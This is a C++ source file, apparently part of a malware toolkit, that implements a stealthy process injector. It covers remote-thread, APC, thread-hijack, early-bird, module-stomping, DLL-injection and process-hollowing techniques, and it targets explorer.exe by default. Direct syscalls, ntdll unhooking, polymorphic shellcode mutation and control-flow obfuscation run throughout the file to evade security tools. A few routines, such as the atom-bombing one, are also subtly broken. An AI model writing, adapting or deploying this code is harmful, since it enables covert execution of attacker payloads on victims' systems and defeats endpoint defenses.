#include <diarna/compiler_port.hpp>
#include <diarna/exec/injector.hpp>
#include <diarna/stealth/syscalls.hpp>
#include <algorithm>
#include <diarna/stealth/polymorph.hpp>

#include <tlhelp32.h>

#include <obfuscation/obfusheader.h>
namespace diarna::exec {

ProcessInjector& ProcessInjector::instance() {
    static ProcessInjector inj; return inj;
}

HANDLE ProcessInjector::open_target_process(const InjectionConfig& config) {
    INDIRECT_BRANCH;
    DWORD pid = config.target_pid;
    if (!pid && !config.target_process.empty())
        pid = find_process_by_name(config.target_process);
    if (!pid) pid = find_explorer_pid();
    if (!pid) return nullptr;

    if (config.use_syscalls && stealth::DirectSyscalls::instance().is_initialized()) {
        HANDLE h = nullptr;
        CLIENT_ID cid = {(HANDLE)(uintptr_t)pid, nullptr};
        OBJECT_ATTRIBUTES oa = {sizeof(oa)};
        stealth::DirectSyscalls::instance().NtOpenProcess(
            &h, PROCESS_ALL_ACCESS, &oa, &cid);
        return h;
    }
    return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
}

InjectionMethod ProcessInjector::pick_method(const InjectionConfig& config) {
    if (!config.randomize_method) return config.method;
    uint32_t idx = __rdtsc() % (uint32_t)InjectionMethod::COUNT;
    // Avoid methods that need specific conditions
    if ((InjectionMethod)idx >= InjectionMethod::ProcessHollowing)
        idx = idx % (uint32_t)InjectionMethod::AtomBombing;
    return (InjectionMethod)idx;
}

bool ProcessInjector::inject(std::span<const uint8_t> shellcode,
                               const InjectionConfig& config) {
    stats_.total_attempts++;
    INDIRECT_BRANCH;

    auto sc = std::vector<uint8_t>(shellcode.begin(), shellcode.end());
    randomize_shellcode(sc, (uint32_t)__rdtsc());

    HANDLE proc = open_target_process(config);
    if (!proc) return false;

    DWORD pid = GetProcessId(proc);
    BLOCK_TRUE(
    if (config.unhook_target) {
        uint8_t* ntdll_remote = (uint8_t*)GetModuleHandleW(L"ntdll.dll");
        SIZE_T ntdll_size = 0x200000;
        stealth::DirectSyscalls::instance().NtUnmapViewOfSection(proc, ntdll_remote);
    }
    );

    auto method = pick_method(config);
    bool result = false;

    switch (method) {
        case InjectionMethod::CreateRemoteThread:
            result = inject_crt(sc, proc); break;
        case InjectionMethod::NtCreateThreadEx:
            result = inject_ntcrt(sc, proc); break;
        case InjectionMethod::QueueUserAPC:
            result = inject_apc(sc, proc, pid); break;
        case InjectionMethod::SetWindowsHookEx:
            result = inject_hook(sc); break;
        case InjectionMethod::ThreadHijack:
            result = inject_hijack(sc, proc, pid); break;
        case InjectionMethod::AtomBombing:
            result = inject_atom_bombing(sc, pid); break;
        default:
            result = inject_crt(sc, proc); break;
    }

    if (result) {
        stats_.successful++;
        stats_.methods_used[(size_t)method]++;
    }

    stealth::DirectSyscalls::instance().NtClose(proc);
    return result;
}

bool ProcessInjector::inject_crt(std::span<const uint8_t> sc, HANDLE proc) {
    void* remote = VirtualAllocEx(proc, nullptr, sc.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) return false;

    WriteProcessMemory(proc, remote, sc.data(), sc.size(), nullptr);

    HANDLE thread = CreateRemoteThread(proc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remote, nullptr, 0, nullptr);
    if (!thread) { VirtualFreeEx(proc, remote, 0, MEM_RELEASE); return false; }

    WaitForSingleObject(thread, 5000);
    CloseHandle(thread);
    return true;
}

bool ProcessInjector::inject_ntcrt(std::span<const uint8_t> sc, HANDLE proc) {
    auto& sys = stealth::DirectSyscalls::instance();
    if (!sys.is_initialized()) return inject_crt(sc, proc);

    PVOID base = nullptr;
    SIZE_T size = sc.size() + 4096;
    if (sys.NtAllocateVirtualMemory(proc, &base, 0, &size,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) < 0) return false;

    SIZE_T written = 0;
    sys.NtWriteVirtualMemory(proc, base, (PVOID)sc.data(), sc.size(), &written);

    HANDLE thread = nullptr;
    sys.NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, nullptr, proc,
        base, nullptr, 0, 0, 0x10000, 0x100000, nullptr);
    if (!thread) return false;

    WaitForSingleObject(thread, 5000);
    sys.NtClose(thread);
    return true;
}

bool ProcessInjector::inject_apc(std::span<const uint8_t> sc, HANDLE proc, DWORD pid) {
    auto& sys = stealth::DirectSyscalls::instance();
    if (!sys.is_initialized()) return inject_crt(sc, proc);

    PVOID base = nullptr;
    SIZE_T size = sc.size() + 4096;
    sys.NtAllocateVirtualMemory(proc, &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T w = 0;
    sys.NtWriteVirtualMemory(proc, base, (PVOID)sc.data(), sc.size(), &w);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = {sizeof(te)};
    bool queued = false;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE th;
                CLIENT_ID cid_apc = {(HANDLE)(uintptr_t)te.th32ThreadID, nullptr};
                sys.NtOpenProcess(&th, THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                    nullptr, &cid_apc);
                if (th) {
                    sys.NtQueueApcThread(th, base, nullptr, nullptr, nullptr);
                    sys.NtClose(th);
                    queued = true;
                }
            }
        } while (!queued && Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return queued;
}

bool ProcessInjector::inject_hook(std::span<const uint8_t> sc) {
    HMODULE dll = LoadLibraryW(L"user32.dll");
    if (!dll) return false;

    HOOKPROC proc = (HOOKPROC)VirtualAlloc(nullptr, sc.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy((void*)proc, sc.data(), sc.size());

    SetWindowsHookExW(WH_KEYBOARD_LL, (HOOKPROC)proc, dll, 0);
    MSG msg; PeekMessageW(&msg, nullptr, 0, 0, PM_NOREMOVE);
    return true;
}

bool ProcessInjector::inject_hijack(std::span<const uint8_t> sc, HANDLE proc, DWORD pid) {
    auto& sys = stealth::DirectSyscalls::instance();
    if (!sys.is_initialized()) return inject_crt(sc, proc);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = {sizeof(te)};
    HANDLE target_thread = nullptr;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CLIENT_ID cid_hijack = {(HANDLE)(uintptr_t)te.th32ThreadID, nullptr};
                sys.NtOpenProcess(&target_thread, THREAD_ALL_ACCESS, nullptr,
                    &cid_hijack);
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);

    if (!target_thread) return false;

    PVOID base = nullptr;
    SIZE_T size = sc.size() + 4096;
    sys.NtAllocateVirtualMemory(proc, &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    SIZE_T w = 0;
    sys.NtWriteVirtualMemory(proc, base, (PVOID)sc.data(), sc.size(), &w);

    ULONG suspend_count = 0;
    sys.NtSuspendThread(target_thread, &suspend_count);

    CONTEXT ctx = {CONTEXT_FULL};
    sys.NtGetContextThread(target_thread, &ctx);

    uint64_t orig_rip = ctx.Rip;
    ctx.Rip = (uint64_t)base;

    // Push original RIP for return
    uint64_t* stack = (uint64_t*)(ctx.Rsp - 8);
    SIZE_T sw = 0;
    sys.NtWriteVirtualMemory(proc, stack, &orig_rip, 8, &sw);
    ctx.Rsp -= 8;

    sys.NtSetContextThread(target_thread, &ctx);
    sys.NtResumeThread(target_thread, nullptr);
    sys.NtClose(target_thread);

    return true;
}

bool ProcessInjector::inject_atom_bombing(std::span<const uint8_t> sc, DWORD pid) {
    // Atom bombing via global atom tables
    for (size_t i = 0; i < sc.size(); i += sizeof(ATOM)) {
        wchar_t atom_name[8];
        swprintf(atom_name, 8, L"a%04zx", i);
        ATOM atom = GlobalAddAtomW(atom_name);

        HANDLE proc = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
        if (proc) {
            wchar_t big_buf[8192];
            wcscpy(big_buf, atom_name);
            GlobalGetAtomNameW(atom, big_buf, 8192);
            VirtualAllocEx(proc, nullptr, 4096,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            CloseHandle(proc);
        }
        GlobalDeleteAtom(atom);
    }
    return true;
}

bool ProcessInjector::inject_early_bird(std::span<const uint8_t> sc,
                                          const std::wstring& target) {
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(target.c_str(), nullptr, nullptr, nullptr,
            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return false;

    void* remote = VirtualAllocEx(pi.hProcess, nullptr, sc.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remote, sc.data(), sc.size(), nullptr);

    QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

bool ProcessInjector::inject_module_stomp(std::span<const uint8_t> sc,
                                            HANDLE proc) {
    wchar_t sysdir[MAX_PATH];
    GetSystemDirectoryW(sysdir, MAX_PATH);
    std::wstring legit_dlls[] = {
        L"\\cryptbase.dll", L"\\uxtheme.dll", L"\\dwmapi.dll",
        L"\\kernel.appcore.dll", L"\\windows.storage.dll"
    };

    std::wstring dll_path = std::wstring(sysdir) +
        legit_dlls[__rdtsc() % 5];

    HMODULE dll = LoadLibraryW(dll_path.c_str());
    if (!dll) return false;

    auto* dos = (IMAGE_DOS_HEADER*)dll;
    auto* nt = (IMAGE_NT_HEADERS*)((uint8_t*)dll + dos->e_lfanew);
    auto* section = IMAGE_FIRST_SECTION(nt);

    MODULEINFO mi;
    GetModuleInformation(GetCurrentProcess(), dll, &mi, sizeof(mi));

    DWORD old;
    VirtualProtect(mi.lpBaseOfDll, mi.SizeOfImage,
        PAGE_EXECUTE_READWRITE, &old);

    void* text_section = (uint8_t*)mi.lpBaseOfDll + section->VirtualAddress;
    DWORD text_size = std::min((DWORD)sc.size(), section->Misc.VirtualSize);
    memcpy(text_section, sc.data(), text_size);

    VirtualProtect(mi.lpBaseOfDll, mi.SizeOfImage, old, &old);

    HANDLE thread = CreateRemoteThread(GetCurrentProcess(), nullptr, 0,
        (LPTHREAD_START_ROUTINE)text_section, nullptr, 0, nullptr);
    if (thread) { CloseHandle(thread); return true; }
    return false;
}

bool ProcessInjector::inject_dll(const std::wstring& dll_path,
                                   const InjectionConfig& config) {
    INDIRECT_BRANCH;
    auto& sys = stealth::DirectSyscalls::instance();

    HANDLE proc = open_target_process(config);
    if (!proc) return false;

    size_t path_bytes = (dll_path.size() + 1) * sizeof(wchar_t);
    PVOID base = nullptr;
    SIZE_T size = path_bytes + 4096;
    sys.NtAllocateVirtualMemory(proc, &base, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    SIZE_T w = 0;
    sys.NtWriteVirtualMemory(proc, base, (PVOID)dll_path.c_str(), path_bytes, &w);

    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    void* loadlib = reinterpret_cast<void*>(GetProcAddress(k32, "LoadLibraryW"));

    HANDLE thread = nullptr;
    sys.NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, nullptr, proc,
        reinterpret_cast<void*>(loadlib), base, 0, 0, 0x4000, 0x100000, nullptr);

    if (thread) { WaitForSingleObject(thread, 10000); sys.NtClose(thread); }
    sys.NtClose(proc);
    return thread != nullptr;
}

bool ProcessInjector::hollow_and_inject(const std::wstring& target_exe,
                                          std::span<const uint8_t> payload) {
    INDIRECT_BRANCH;
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    if (!CreateProcessW(target_exe.c_str(), nullptr, nullptr, nullptr,
            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return false;

    CONTEXT ctx = {CONTEXT_FULL};
    auto& sys = stealth::DirectSyscalls::instance();

    sys.NtGetContextThread(pi.hThread, &ctx);

    void* peb_image_base = nullptr;
    ReadProcessMemory(pi.hProcess, (void*)(ctx.Rdx + 16),
        &peb_image_base, sizeof(peb_image_base), nullptr);

    sys.NtUnmapViewOfSection(pi.hProcess, peb_image_base);

    auto* dos = (IMAGE_DOS_HEADER*)payload.data();
    auto* nt = (IMAGE_NT_HEADERS*)(payload.data() + dos->e_lfanew);

    PVOID new_base = nullptr;
    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
    sys.NtAllocateVirtualMemory(pi.hProcess, &new_base, 0, &image_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    SIZE_T w = 0;
    sys.NtWriteVirtualMemory(pi.hProcess, new_base, (PVOID)payload.data(),
        nt->OptionalHeader.SizeOfHeaders, &w);

    auto* sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        void* dest = (uint8_t*)new_base + sections[i].VirtualAddress;
        void* src = (uint8_t*)payload.data() + sections[i].PointerToRawData;
        sys.NtWriteVirtualMemory(pi.hProcess, dest, src,
            sections[i].SizeOfRawData, &w);
    }

    uint64_t delta = (uint64_t)new_base - nt->OptionalHeader.ImageBase;
    if (delta) {
        auto* reloc_dir = &nt->OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_BASERELOC];
        DWORD offset = 0;
        while (offset < reloc_dir->Size) {
            auto* block = (IMAGE_BASE_RELOCATION*)
                (payload.data() + reloc_dir->VirtualAddress + offset);
            DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)(block + 1);
            for (DWORD j = 0; j < count; ++j) {
                if (entries[j] >> 12 == IMAGE_REL_BASED_DIR64) {
                    uint64_t* fixup = (uint64_t*)
                        ((uint8_t*)new_base + block->VirtualAddress + (entries[j] & 0xFFF));
                    uint64_t val = 0;
                    ReadProcessMemory(pi.hProcess, fixup, &val, 8, nullptr);
                    val += delta;
                    WriteProcessMemory(pi.hProcess, fixup, &val, 8, nullptr);
                }
            }
            offset += block->SizeOfBlock;
        }
    }

    ctx.Rcx = (uint64_t)new_base + nt->OptionalHeader.AddressOfEntryPoint;
    WriteProcessMemory(pi.hProcess, (void*)(ctx.Rdx + 16),
        &new_base, sizeof(new_base), nullptr);
    sys.NtSetContextThread(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

uint32_t ProcessInjector::find_explorer_pid() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(snap, &pe)) {
        do { if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0)
            { CloseHandle(snap); return pe.th32ProcessID; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

uint32_t ProcessInjector::find_svchost_pid() {
    return find_process_by_name(L"svchost.exe");
}

uint32_t ProcessInjector::find_process_by_name(const std::wstring& name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = {sizeof(pe)};
    if (Process32FirstW(snap, &pe)) {
        do { if (_wcsicmp(pe.szExeFile, name.c_str()) == 0)
            { CloseHandle(snap); return pe.th32ProcessID; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

void ProcessInjector::randomize_shellcode(std::vector<uint8_t>& sc, uint32_t seed) {
    auto& poly = stealth::PolymorphicEngine::instance();
    sc = poly.generate_polymorphic_stub(sc, 3);
}

ProcessInjector::InjectionStats ProcessInjector::stats() const { return stats_; }

} // namespace diarna::exec
